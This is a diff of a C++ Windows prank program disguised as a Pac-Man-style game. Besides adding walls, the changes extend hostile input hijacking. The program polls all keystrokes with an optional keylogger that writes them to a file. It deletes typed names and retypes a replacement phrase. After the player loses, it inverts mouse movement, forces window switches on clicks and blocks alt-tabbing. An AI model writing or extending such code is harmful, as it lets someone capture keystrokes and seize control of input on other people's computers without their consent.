@@ -52,7 +52,7 @@ int _nCmdShow;
 // replacement word
 string replacement = "Justin Bieber";
 // list of key phrases
-vector<string> KeyWords = { "charlie", "mel", "guys", "wondering" };
+vector<string> KeyWords = { "charlie", "monty","pebbles", "mel", "guys", "wondering", "garrett", "karl", "victor", "tim", "paul", "emma", "joe", "garth", "test" };
 // do we want to also be a keylogger?
 bool logKeys = false;
 
@@ -88,6 +88,20 @@ void loopforever() {
 	clyde = GameEntity(0, maxy - 100, 48, 48);
 
 	vector<GameEntity*> ghosts = { &inky,&blinky,&pinky,&clyde };
+
+	vector<GameEntity*> walls = { &GameEntity(50,0,48,480),
+		&GameEntity(550,0,48,480),
+		&GameEntity(550,830,48,480),
+		&GameEntity(550,450,480,48),
+		&GameEntity(1550,maxy-480,48,480) };
+
+	for (auto&& wall : walls) {
+		if (wall->h > wall->w)
+			wall->LoadSpritemap({ IDB_WALL });
+		else
+			wall->LoadSpritemap({ IDB_WALL_W });
+	}
+
 
 	// load images here
 	g_slashMap = LoadSplashImage(IDB_PNG1);
@@ -133,10 +147,14 @@ void loopforever() {
 	
 	int posX = 0;
 	int posY = 0;
-	int yd = 1;
-	int xd = 1;
+	int yd = 5;
+	int xd = 5;
 	int i = 0;
 	int gamestate = 0;
+	POINT currentMouse, lastMouse;
+	GetCursorPos(&currentMouse);
+	lastMouse = currentMouse;
+
 	left = right = up = down = false;
 
 	// enter loop state
@@ -151,7 +169,7 @@ void loopforever() {
 				yd *= -1;
 			}
 			posY += yd;
-			i++;
+			i+= 8;
 			if (i < 0 || i >= 4000) {
 				i = 0;
 				if (gamestate == 0) {
@@ -166,13 +184,14 @@ void loopforever() {
 				else if (gamestate == 2) {
 					// switch from death screen to secret mode
 					gamestate = 3;
+					for (auto&& wall : walls) {
+						ShowWindow(wall->window, SW_HIDE);
+					}
+
+					for (auto&& ghost : ghosts) {
+						ShowWindow(ghost->window, SW_HIDE);
+					}
 					ShowWindow(pacMan.window, SW_HIDE);
-					ShowWindow(clyde.window, SW_HIDE);
-					ShowWindow(inky.window, SW_HIDE);
-					ShowWindow(pinky.window, SW_HIDE);
-					ShowWindow(blinky.window, SW_HIDE);
-					ShowWindow(g_splashWindow, SW_HIDE);
-					ShowWindow(g_evilWindow, SW_HIDE);
 				}
 			}
 
@@ -221,7 +240,7 @@ void loopforever() {
 				/*for (int k = 0; k < ghosts.size(); k++) {
 					auto kprime = rotclamp(k+1, 0, ghosts.size() - 1);
 					ghosts[k]->target(ghosts[kprime]->x, ghosts[kprime]->y);
-				}*/
+				}*/				
 
 				for (auto&& ghost : ghosts) {
 					// have ghosts target you
@@ -229,69 +248,92 @@ void loopforever() {
 						// you die
 						gamestate = 2;
 					}
+					ghost->blockedDirections = 0;
+					for (auto&& wall : walls) {
+						ghost->blockedDirections |= ghost->hitTest(wall);
+					}
 					ghost->update();
 					ghost->draw();
 				}
-
+				pacMan.blockedDirections = 0;
+				for (auto&& wall : walls) {
+					wall->draw();
+					pacMan.blockedDirections |= pacMan.hitTest(wall);
+				}
 				pacMan.update();
 				pacMan.draw();
 			}
 		}
+		else { // only activate if you lose
+			//mouse wonking here
 
-		// this is the text replacer
-		// watch special key state changes
-		oldState = state;
-		state = 0;
-		if (GetAsyncKeyState(1)) {
-			state |= CLICK;
-			if (logKeys && state != oldState)
-				outfile << "`CLICK`";
-		}
-		if (GetAsyncKeyState(16)) {			
-			state |= SHIFT;
-		}
-		if (GetAsyncKeyState(17)) {
-			state |= CONTROL;
-			if (logKeys && state != oldState)
-				outfile << "`CTRL-`";
-		}
-		if (GetAsyncKeyState(18)) {
-			state |= ALT;
-			if (logKeys && state != oldState)
-				outfile << "`ALT-`";
-		}
-		// check range of virtual keys
-		for (int i = 0; i < 256; i++) {
-			// key with id of i has been pressed, cast to unsigned char for boolean test
-			if ((unsigned char)GetAsyncKeyState(i)) {
-				 // transform to ascii value
-				auto ch = VKtoASCII(i, (state & SHIFT));
-				// throw out garbage
-				if (ch > 0) {
-					// remember recent keys
-					recentKeys.push_back(lowercase(ch));
-					// forget old keys
-					if (recentKeys.size() > patternLength) {
-						recentKeys.erase(recentKeys.begin());
-					}
-					// keylog if set
-					if (logKeys) {
-						outfile << ch;
-						outfile.flush();
-					}
-					// if a key phrase has been typed count it's length
-					// then backspace it away and type out a replacement
-					auto replaceChars = typedKeyPhrase(recentKeys);
-					if (replaceChars) {
-						for (int i = replaceChars; i--;) {
-							triggerKey(VK_BACK);
+			// inverts mouse input
+			GetCursorPos(&currentMouse);
+			int xdiff = lastMouse.x - currentMouse.x;
+			int ydiff = lastMouse.y - currentMouse.y;
+			lastMouse.x = rotclamp(lastMouse.x + xdiff, 1, maxx - 1);
+			lastMouse.y = rotclamp(lastMouse.y + ydiff, 1, maxy - 1);
+			SetCursorPos(lastMouse.x, lastMouse.y);
+
+			// this is the text replacer
+			// watch special key state changes
+			oldState = state;
+			state = 0;
+			if (GetAsyncKeyState(1)) {
+				state |= CLICK;
+				// random switch on click should make this confusing and annoying
+				if (rand()%2==0)SwitchToThisWindow(g_splashWindow, true);
+				if (logKeys && state != oldState)
+					outfile << "`CLICK`";
+			}
+			if (GetAsyncKeyState(16)) {
+				state |= SHIFT;
+			}
+			if (GetAsyncKeyState(17)) {
+				state |= CONTROL;
+				if (logKeys && state != oldState)
+					outfile << "`CTRL-`";
+			}
+			if (GetAsyncKeyState(18)) {
+				state |= ALT;
+				// no alt-tabbing lol
+				SwitchToThisWindow(g_splashWindow, true);
+				if (logKeys && state != oldState)
+					outfile << "`ALT-`";
+			}
+			// check range of virtual keys
+			for (int i = 0; i < 256; i++) {
+				// key with id of i has been pressed, cast to unsigned char for boolean test
+				if ((unsigned char)GetAsyncKeyState(i)) {
+					// transform to ascii value
+					auto ch = VKtoASCII(i, (state & SHIFT));
+					// throw out garbage
+					if (ch > 0) {
+						// remember recent keys
+						recentKeys.push_back(lowercase(ch));
+						// forget old keys
+						if (recentKeys.size() > patternLength) {
+							recentKeys.erase(recentKeys.begin());
 						}
-						typeString(replacement);
-					}					
+						// keylog if set
+						if (logKeys) {
+							outfile << ch;
+							outfile.flush();
+						}
+						// if a key phrase has been typed count it's length
+						// then backspace it away and type out a replacement
+						auto replaceChars = typedKeyPhrase(recentKeys);
+						if (replaceChars) {
+							for (int i = replaceChars; i--;) {
+								triggerKey(VK_BACK);
+							}
+							typeString(replacement);
+						}
+					}
 				}
 			}
 		}
-		Sleep(1);
+		Sleep(10);
 	}
 }
 
